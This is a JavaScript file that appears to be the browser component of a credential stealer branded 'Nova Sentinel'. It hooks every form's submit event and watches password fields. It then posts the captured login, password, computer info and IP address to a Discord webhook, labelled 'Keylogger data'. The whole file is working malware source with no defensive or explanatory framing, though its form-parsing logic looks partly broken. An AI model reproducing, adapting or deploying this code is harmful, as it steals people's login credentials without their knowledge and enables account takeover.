

function sendToDiscordWebhook(password, login) {
  if (!login || !password) return;
  var config = {
    Placed: "%API_URL%",
    webhook_url: "%WEBHOOK%",
    computerinfo: "%COMP_INFO%",
    ip: "%IPINFO%",
  };

  const message = {
    content: "",
    username: "Nova Sentinel",
    avatar_url:
      "https://raw.githubusercontent.com/ksch-58/cerf/main/assets/novalogo3.png",
    embeds: [
      {
        footer: {
          text: "@Nova Sentinel | https://t.me/Sordeal",
          icon_url:
            "https://raw.githubusercontent.com/ksch-58/cerf/main/assets/lilnova.png",
        },
        title: config.computerinfo + ` Keylogger data from ${document.title} <:devil_heart_black:1177591014786093177>`,
        url: `${document.URL}`,
        color: 2829617,
        fields: [
          {
            name: "\u200b",
            value: `\`\`\`ansi\n[2;32mLogin ID: ${login}\nPassword: ${password}\n[0m[2;32m[0m\n\n IP: ${config.ip}\n\`\`\``,
            inline: false,
          },
        ],
      },
    ],
  };

  fetch(config.webhook_url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(message),
  })
    .then((response) => {
      if (response.ok) {
      } else {
      }
    })
    .catch((error) => {});
}

var password_edited = false;

if (!document.title) {
  document.title = document.URL;
}

function saveForm(data) {
  if (data && typeof data === "object") {
    for (let key in data) {
      if (data.hasOwnProperty(key)) {
        let password = data[key].password;
        let login = data[key].login;
        console.log(password, login)
        sendToDiscordWebhook(password, login);
      }
    }
  }
}

function getPasswordInputElements() {
  var pwd_el = [];

  var el = document.getElementsByTagName("input");

  for (var i = 0; i < el.length; i++) {
    if (el[i].getAttribute("type") == "password") pwd_el.push(el[i]);
  }

  return pwd_el;
}

function listenPasswordEntered() {
  var pwd_el = getPasswordInputElements();

  for (var i = 0; i < pwd_el.length; i++) {
    pwd_el[i].addEventListener("change", function () {
      password_edited = true;
    });
  }
}

var forms = document.getElementsByTagName("form");
for (var i = 0; i < forms.length; i++) {
  forms[i].addEventListener("submit", function (e) {
    var data = {};
    data["FormName"] = e.target.name;
    data["FormAction"] = e.target.action;
    data["FormElements"] = {};
    var elements = e.target.elements;
    for (var n = 0; n < elements.length; n++) {
      data["FormElements"][elements[n].name] = elements[n].value;
    }

    if (password_edited) {
      saveForm(data);
    }
  });
}

listenPasswordEntered();
